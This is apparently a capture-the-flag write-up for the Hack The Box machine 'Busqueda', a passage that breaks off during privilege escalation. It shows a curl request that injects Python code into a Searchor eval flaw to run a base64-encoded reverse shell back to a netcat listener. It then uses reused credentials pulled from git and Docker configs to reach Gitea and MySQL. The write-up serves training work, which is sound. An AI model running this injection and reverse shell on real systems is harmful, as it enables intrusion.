+++
title = "Busqueda"
date = "2023-04-10"
description = "This is an easy Linux box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Linux

**Release date**: 2023-04-08

**Created by**: [kavigihan](https://app.hackthebox.com/users/389926)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with `sudo`, which gets cumbersome in the long run.

I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box.
   I'll call it `workspace`, and it will be located at the root of my filesystem
   `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll use
   `httpsimpleserver` to create an HTTP server on port `80` and
   `impacket-smbserver` to create an SMB share named `server`. This will make
   files in this folder available over the Internet, which will be especially
   useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory.
   This will come in handy once we get a foothold, for privilege escalation and
   for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.10`. The
commands ran on my machine will be prefixed with `❯` for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Host `10.10.11.208`

## Scanning

### Ports

As usual, let's start by initiating a port scan on Busqueda using a TCP SYN
`nmap` scan to assess its attack surface.

```sh
❯ nmap -sS "10.10.11.208" -p-
```

```
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
<SNIP>
```

Let's also check the 500 most common UDP ports.

```sh
❯ nmap -sU "10.10.11.208" --top-ports "500"
```

```
<SNIP>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
<SNIP>
```

### Fingerprinting

Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.

```sh
❯ nmap -sS "10.10.11.208" -p "22,80" -sV
```

```
<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Let's do the same for the UDP port.

```sh
❯ nmap -sU "10.10.11.208" -p "68" -sV
```

```
<SNIP>
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
<SNIP>
```

Alright, so `nmap` managed to determine that Busqueda is running Linux, and the
version of SSH suggests that it might be Ubuntu. It also found that its hostname
is `searcher.htb`.

### Scripts

Let's run `nmap`'s default scripts on the TCP services to see if they can find
additional information.

```sh
❯ nmap -sS "10.10.11.208" -p "22,80" -sC
```

```
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://searcher.htb/
<SNIP>
```

Let's also run them on the UDP service.

```sh
❯ nmap -sU "10.10.11.208" -p "68" -sC
```

```
<SNIP>
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
<SNIP>
```

The `http-title` script indicates that the Apache server redirects to
`http://searcher.htb/`. I'll add it to my `/etc/hosts` file.

```sh
❯ echo "10.10.11.208 searcher.htb" >> /etc/hosts
```

## Services enumeration

### Apache

#### Fingerprinting

Let's use `whatweb` to fingerprint the domain homepage.

```sh
❯ whatweb -a3 "http://searcher.htb/" -v
```

```
WhatWeb report for http://searcher.htb/
Status    : 200 OK
Title     : Searcher
IP        : 10.10.11.208
Country   : RESERVED, ZZ

Summary   : Bootstrap[4.1.3], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], JQuery[3.2.1], Python[3.10.6], Script, Werkzeug[2.1.2]

Detected Plugins:
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 

        Version      : 4.1.3
        Website     : https://getbootstrap.com/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Werkzeug/2.1.2 Python/3.10.6 (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Version      : 3.2.1
        Website     : http://jquery.com/

[ Python ]
        Python is a programming language that lets you work more 
        quickly and integrate your systems more effectively. You 
        can learn to use Python and see almost immediate gains in 
        productivity and lower maintenance costs. 

        Version      : 3.10.6
        Website     : http://www.python.org/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


[ Werkzeug ]
        Werkzeug is a WSGI utility library for Python. 

        Version      : 2.1.2
        Website     : http://werkzeug.pocoo.org/

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 09 Feb 2024 16:02:20 GMT
        Server: Werkzeug/2.1.2 Python/3.10.6
        Content-Type: text/html; charset=utf-8
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 3355
        Connection: close
```

This reveals that this website is using Bootstrap and the Werkzeug library
version `2.1.2` for Python version `3.10.6`.

#### Exploration

Let's browse to `http://searcher.htb/`.

![Domain homepage](domain-homepage.png)

Apparently, it's a website used to search keywords across social medias and the
web.

We're given a form, which we can fill with a selection of engines, and with
keywords to search for. We also have the possibility of ticking a checkbox to
get redirected to the result instead of just getting the URL.

Interestingly, the footer of the website leaks that it's using Flask and
[Searchor](https://github.com/ArjunSharda/Searchor) version `2.4.0`.

> Searchor is an all-in-one PyPi Python Library that simplifies web scraping,
> obtaining information on an topic, and generating search query URLs.
>
> — [GitHub](https://github.com/ArjunSharda/Searchor)

#### Known vulnerabilities

Before trying to mess with the form we have, let's check the [GitHub page of
Searchor](https://github.com/ArjunSharda/Searchor).

We know it's using version `2.4.0`. If we check the
[releases](https://github.com/ArjunSharda/Searchor/releases) notes for each
version, we see that the version `2.4.2` 'Patched a priority vulnerability in
the Searchor CLI', and links to
[this pull request](https://github.com/ArjunSharda/Searchor/pull/130).

If we read it, we see that it actually fixes a RCE vulnerability!

## Foothold (RCE)

Searchor versions prior to `2.4.2` are affected by a RCE. The vulnerability
stems from the `eval` function call used on user-supplied inputs in the search
functionality, the core of the library. Therefore, an attacker can enter
specific inputs to execute commands on the server.

### Preparation

The goal is to obtain a reverse shell.

First, I'll setup a listener to receive the shell.

```sh
❯ rlwrap nc -lvnp "9001"
```

Then, I'll choose the 'nc mkfifo' payload from
[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
shell.

I'll save the Base64 encoded version of it as the `COMMAND` shell variable.

### Exploitation

Let's send a request to Busqueda to execute our payload.

```sh
❯ curl -s -o "/dev/null" "http://searcher.htb/search" -X "POST" -d "engine=Accuweather&query=',__import__('os').system('echo $COMMAND | base64 -d | bash -i'))#"
```

If we check our listener:

```
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 42738
<SNIP>
svc@busqueda:/var/www/app$
```

It caught the reverse shell!

### Stabilizing the shell

Our home folder doesn't contain a `.ssh` folder, so I'll create one. Then I'll
create a private key and I'll add the corresponding key to `authorized_keys`.
Finally I'll connect over SSH to Busqueda. This way, I'll have a much more
stable shell.

## Getting a lay of the land

If we run `whoami`, we see that we got a foothold as `svc`.

### Architecture

What is Busqueda's architecture?

```sh
svc@busqueda:~$ uname -m
```

```
x86_64
```

It's using x86_64. Let's keep that in mind to select the appropriate binaries.

### Distribution

Let's see which distribution Busqueda is using.

```sh
svc@busqueda:~$ cat "/etc/lsb-release"
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
```

Okay, so it's Ubuntu 22.04.

### Kernel

Let's find the kernel version of Busqueda.

```sh
svc@busqueda:~$ uname -r
```

```
5.15.0-69-generic
```

It's `5.15.0`.

### Users

Let's enumerate all users.

```sh
svc@busqueda:~$ grep ".*sh$" "/etc/passwd" | cut -d ":" -f "1" | sort
```

```
root
svc
```

There's `svc` (us) and `root`.

### Groups

Let's enumerate all groups.

```sh
svc@busqueda:~$ cat "/etc/group" | cut -d ":" -f "1" | sort
```

```
adm
audio
backup
bin
cdrom
crontab
daemon
dialout
dip
disk
docker
fax
floppy
fwupd-refresh
games
gnats
input
irc
kmem
kvm
landscape
_laurel
list
lp
lxd
mail
man
messagebus
netdev
news
nogroup
operator
plugdev
proxy
render
root
sasl
sgx
shadow
src
_ssh
ssl-cert
staff
sudo
svc
sys
syslog
systemd-journal
systemd-network
systemd-resolve
systemd-timesync
tape
tcpdump
tss
tty
users
utmp
uucp
uuidd
video
voice
www-data
```

The `docker` and `lxd` groups are interesting to elevate privileges. We also
notice a `_ssh` group, which is custom.

### NICs

Let's gather the list of connected NICs.

```sh
svc@busqueda:~$ ifconfig
```

```
br-c954bf22b8b2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:45:be:a3:50  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-cbf2c5ce8e95: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::42:82ff:fe1d:4ddd  prefixlen 64  scopeid 0x20<link>
        ether 02:42:82:1d:4d:dd  txqueuelen 0  (Ethernet)
        RX packets 116  bytes 12814 (12.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 107  bytes 26915 (26.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-fba5a3e31476: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:3d:4b:e3:bb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:0c:96:f2:07  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.208  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:4840  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:4840  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:48:40  txqueuelen 1000  (Ethernet)
        RX packets 191  bytes 23351 (23.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 289  bytes 36267 (36.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 539  bytes 38885 (38.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 539  bytes 38885 (38.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth05a10ec: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::1847:9dff:fec8:1e37  prefixlen 64  scopeid 0x20<link>
        ether 1a:47:9d:c8:1e:37  txqueuelen 0  (Ethernet)
        RX packets 808  bytes 334155 (334.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 850  bytes 161498 (161.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth4577fd8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::4089:44ff:fe8d:eda9  prefixlen 64  scopeid 0x20<link>
        ether 42:89:44:8d:ed:a9  txqueuelen 0  (Ethernet)
        RX packets 732  bytes 133757 (133.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 708  bytes 320957 (320.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

There are physical Ethernet interfaces, virtual Ethernet interfaces, the
loopback interface and a few bridges (including one for Docker).

### Hostname

What is Busqueda's hostname?

```sh
svc@busqueda:~$ hostname
```

```
busqueda
```

Yeah I know, very surprising.

### Flags

If we check our home folder, we find the user flag.

```sh
svc@busqueda:~$ cat "/home/svc/user.txt"
```

```
24e053901c93a1184a983b81af96883f
```

### Home folders

If we explore out home folder, we notice a `.gitconfig` file:

```
[user]
        email = cody@searcher.htb
        name = cody
<SNIP>
```

This user actually corresponds to `cody`. The presence of this file suggests
that Git is used on the system.

### Website code review

Let's review the content of the Apache website, located at `/var/www/app`.

```py
<SNIP>
@app.route('/')
def index():
    return render_template('index.html', options=Engine.__members__, error='')

@app.route('/search', methods=['POST'])
def search():
    try:
        engine = request.form.get('engine')
        query = request.form.get('query')
        auto_redirect = request.form.get('auto_redirect')
        
        if engine in Engine.__members__.keys():
            arg_list = ['searchor', 'search', engine, query]
            r = subprocess.run(arg_list, capture_output=True)
            url = r.stdout.strip().decode()
            if auto_redirect is not None:
                return redirect(url, code=302)
            else:
                return url

        else:
            return render_template('index.html', options=Engine.__members__, error="Invalid engine!")

    except Exception as e:
        print(e)
        return render_template('index.html', options=Engine.__members__, error="Something went wrong!")
<SNIP>
```

The `app.py` file uses Flask under the hood, as we already discovered. It's a
really simple app, it only contains two routes: `/`, which renders the
`index.html` template, and `/search`, which handles form submission via the POST
method.

We also find a `.git` folder. This must be why we found a `.gitconfig` file in
our home folder!

The `config` file is particularly interesting:

```
<SNIP>
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
<SNIP>
```

It discloses the presence of a Git repository on Gitea, which can be accessed at
the subdomain `gitea.searcher.htb`, as well as credentials used to access it:
`cody`:`jh1usoih2bkjaspwe92`.

> The goal of this project is to make the easiest, fastest, and most painless
> way of setting up a self-hosted Git service.
>
> — [GitHub](https://github.com/go-gitea/gitea)

I'll add this subdomain to my `/etc/hosts` file.

```sh
❯ echo "10.10.11.208 gitea.searcher.htb" >> /etc/hosts
```

## Services enumeration

### Apache

#### Fingerprinting

Let's use `whatweb` to fingerprint the subdomain homepage.

```sh
❯ whatweb -a3 "http://gitea.searcher.htb/" -v
```

```
WhatWeb report for http://gitea.searcher.htb/
Status    : 200 OK
Title     : Gitea: Git with a cup of tea
IP        : 10.10.11.208
Country   : RESERVED, ZZ

Summary   : Apache[2.4.52], Cookies[_csrf,i_like_gitea,macaron_flash], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[_csrf,i_like_gitea,macaron_flash], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, X-Frame-Options[SAMEORIGIN]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.52 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : i_like_gitea
        String       : _csrf
        String       : macaron_flash

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.52 (Ubuntu) (from server string)

[ HttpOnly ]
        If the HttpOnly flag is included in the HTTP set-cookie 
        response header and the browser supports it then the cookie 
        cannot be accessed through client side script - More Info: 
        http://en.wikipedia.org/wiki/HTTP_cookie 

        String       : _csrf,i_like_gitea,macaron_flash

[ Meta-Author ]
        This plugin retrieves the author name from the meta name 
        tag - info: 
        http://www.webmarketingnow.com/tips/meta-tags-uncovered.html
        #author

        String       : Gitea - Git with a cup of tea

[ Open-Graph-Protocol ]
        The Open Graph protocol enables you to integrate your Web 
        pages into the social graph. It is currently designed for 
        Web pages representing profiles of real-world things . 
        things like movies, sports teams, celebrities, and 
        restaurants. Including Open Graph tags on your Web page, 
        makes your page equivalent to a Facebook Page. 

        Version      : website

[ PoweredBy ]
        This plugin identifies instances of 'Powered by x' text and 
        attempts to extract the value for x. 

        String       : Gitea

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


[ X-Frame-Options ]
        This plugin retrieves the X-Frame-Options value from the 
        HTTP header. - More Info: 
        http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
        aspx

        String       : SAMEORIGIN

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Sat, 10 Feb 2024 07:56:00 GMT
        Server: Apache/2.4.52 (Ubuntu)
        Cache-Control: no-store, no-transform
        Content-Type: text/html; charset=UTF-8
        X-Frame-Options: SAMEORIGIN
        Set-Cookie: i_like_gitea=5758a83c3364a583; Path=/; HttpOnly; SameSite=Lax
        Set-Cookie: _csrf=lrSJbPGejw4EfRE0PVmHO2TVLiU6MTcwNzU1MTc2MDE2NDQwMDEwOQ; Path=/; Expires=Sun, 11 Feb 2024 07:56:00 GMT; HttpOnly; SameSite=Lax
        Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 5114
        Connection: close
```

#### Exploration

Let's browse to `http://gitea.searcher.htb/`.

![Subdomain homepage](subdomain-homepage.png)

This is a standard Gitea installation.

The footer of the website leaks that it's using Gitea version `1.18.0+rc1`.

Without logging in, we can't find any repository. We can list the users though:

![Subdomain users page](subdomain-users-page.png)

There's `cody` and `administrator`.

Let's log in using the credentials we find [earlier](#website-code-review).

Now we have access to the `Searcher_site` repository:

![Subdomain searcher repository](subdomain-searcher-repository.png)

However, we find nothing new, it's the same as the version on the system.

I tried to log in as `administrator` with the same password as `cody`, but it
failed.

## Getting a lay of the land

### Sudo permissions

Let's see if we can execute anything as another user with `sudo`.

```sh
svc@busqueda:~$ sudo -l
```

```
[sudo] password for svc:
```

We're asked to enter a password. Let's enter the same as for `cody`'s Gitea
account, `jh1usoih2bkjaspwe92`.

```
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

It worked! We can execute the `system-checkup.py` script in `/opt/scripts` with
the `*` argument as `root`.

### Exploring `/opt/scripts`

Let's retrieve the content of this folder.

```sh
svc@busqueda:~$ ls -la "/opt/scripts"
```

```
<SNIP>
drwxr-xr-x 3 root root 4096 Dec 24  2022 .
drwxr-xr-x 4 root root 4096 Mar  1  2023 ..
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3  2023 .git
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
```

It contains the `system-checkup.py` file, which we can execute with `sudo`, but
also `check-ports.py`, `full-checkup.sh` and `install-flask.sh`. Unfortunately,
we don't have the necessary rights to read or write to these files.

We also notice a `.git` file... maybe it corresponds to a repository on Gitea?

### Inspecting `/opt/scripts/system-checkup.py`

We can only execute this file, so let's do it.

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "*"
```

```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

We can give three different arguments to this program. Let's try all of them.

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "docker-ps"
```

```
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   13 months ago   Up 39 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   13 months ago   Up 39 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

This command corresponds to `docker ps`. It indicates that there's two
containers running, one for `gitea` and one for `mysql_db`.

We already explored Gitea, but we found nothing noteworthy. However, we didn't
explore MySQL! The issue is that it's running inside a container, and we don't
have this container's IP.

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "docker-inspect"
```

```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

This command corresponds to `docker inspect`. We need to specify a format and a
container name. If we search online, we find a
[docs page](https://docs.docker.com/config/formatting/) that indicates the
syntax used to format output.

Let's inspect the `gitea` container:

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "docker-inspect" "{{json .}}" "gitea" | jq
```

```
<SNIP>
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
<SNIP>
```

The output is really long, so I only included the interesting part. It indicates
that Gitea uses MySQL to manage authentication credentials. To do connect to
MySQL, it uses the credentials `gitea`:`yuiu1hoiu4i5ho1uh`.

We have credentials to connect to MySQL, but we still don't know how to connect
to it. Let's retrieve the IP of the `mysql_db` container:

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "docker-inspect" "{{json .NetworkSettings.Networks}}" "mysql_db" | jq
```

```
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "daed223b03681bedbebb3869ccabe140641fdf8b80e45116716a089515c64344",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```

It's `172.19.0.3`!

We haven't tried the last command argument though, so let's do it.

```sh
svc@busqueda:~$ sudo "/usr/bin/python3" "/opt/scripts/system-checkup.py" "full-checkup"
```

```
Something went wrong
```

We get an error message.

# Host `172.19.0.3`

## Services enumeration

### MySQL

Let's connect to the MySQL server running inside the Docker container with IP
`172.19.0.3`, from the host `10.10.11.208`, using the credentials in the Gitea
configuration:

```sh
svc@busqueda:~$ mysql -h "172.19.0.3" -u "gitea" -p"yuiu1hoiu4i5ho1uh"
```

```
mysql>
```

#### Version

Let's find out the version of MySQL in use.

```sh
mysql> SELECT @@version;
```

```
+-----------+
| @@version |
+-----------+
| 8.0.31    |
+-----------+
<SNIP>
```

So it's MySQL version `8.0.31`.

#### Databases

Now, let's see which databases are available.

```sh
mysql> SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+
<SNIP>
```

The `gitea` database is the only non-default one.

#### `gitea`'s tables

Let's see which tables are included in this database.

```sh
mysql> SHOW tables;
```

```
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
<SNIP>
```

There's a lot of tables! But `user` is probably the most interesting.

#### `user`'s columns

Let's continue our enumeration of this database by checking the content of the
`user` table.

```sh
mysql> SELECT column_type, column_name FROM information_schema.columns WHERE table_name = 'user';
```

```
+---------------+--------------------------------+
| COLUMN_TYPE   | COLUMN_NAME                    |
+---------------+--------------------------------+
| tinyint(1)    | allow_create_organization      |
| tinyint(1)    | allow_git_hook                 |
| tinyint(1)    | allow_import_local             |
| varchar(2048) | avatar                         |
| varchar(255)  | avatar_email                   |
| bigint        | created_unix                   |
| varchar(255)  | description                    |
| varchar(255)  | diff_view_style                |
| varchar(255)  | email                          |
| varchar(20)   | email_notifications_preference |
| varchar(255)  | full_name                      |
| bigint        | id                             |
| tinyint(1)    | is_active                      |
| tinyint(1)    | is_admin                       |
| tinyint(1)    | is_restricted                  |
| tinyint(1)    | keep_activity_private          |
| tinyint(1)    | keep_email_private             |
| varchar(5)    | language                       |
| bigint        | last_login_unix                |
| tinyint(1)    | last_repo_visibility           |
| varchar(255)  | location                       |
| varchar(255)  | login_name                     |
| bigint        | login_source                   |
| int           | login_type                     |
| varchar(255)  | lower_name                     |
| int           | max_repo_creation              |
| tinyint(1)    | must_change_password           |
| varchar(255)  | name                           |
| int           | num_followers                  |
| int           | num_following                  |
| int           | num_members                    |
| int           | num_repos                      |
| int           | num_stars                      |
| int           | num_teams                      |
| varchar(255)  | passwd                         |
| varchar(255)  | passwd_hash_algo               |
| tinyint(1)    | prohibit_login                 |
| varchar(32)   | rands                          |
| tinyint(1)    | repo_admin_change_team_access  |
| varchar(32)   | salt                           |
| varchar(255)  | theme                          |
| int           | type                           |
| bigint        | updated_unix                   |
| tinyint(1)    | use_custom_avatar              |
| int           | visibility                     |
| varchar(255)  | website                        |
+---------------+--------------------------------+
<SNIP>
```

Okay, so this table contains 46 columns.

#### `users`'s columns content

Let's retrieve the content of the `username` and `passwd` columns.

```sh
mysql> SELECT name, passwd_hash_algo, salt, passwd FROM user;
```

```
+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | passwd_hash_algo | salt                             | passwd                                                                                               |
+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | pbkdf2           | a378d3f64143b284f104c926b8b49dfb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | pbkdf2           | d1db0a75a18e50de754be2aafcad5533 | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
<SNIP>
```

We get the hashing algorithm, salt and password hash for `administrator` and
`cody`.

The issue is that we don't know the number of rounds applied to these hashes, so
we can't crack them.

# Host `10.10.11.208`

## Services enumeration

### Apache

#### Exploration

Let's think for a while. We have two passwords at our disposal:
`jh1usoih2bkjaspwe92` used by `cody`, and `yuiu1hoiu4i5ho1uh` used by Gitea to
log in to the MySQL database. If `cody` and `administrator` are two separate
accounts, `administrator` is probably the one that set up the Gitea server.
Maybe he reuses his password?

![Subdomain administrator user](subdomain-administrator-user.png)

It worked! He indeed reuses his credentials.

We notice that `administrator` has a `scripts` repository. Let's check it.

![Subdomain scripts repository](subdomain-scripts-repository.png)

This is the repository corresponding to the `/opt/scripts` folder!

If we check `system-checkup.py`, we see that the `docker-inspect` argument
actually corresponds to the `docker inspect` command, and `docker-ps` to
`docker ps`. The `full-checkup` command tries to execute the `full-checkup.sh`
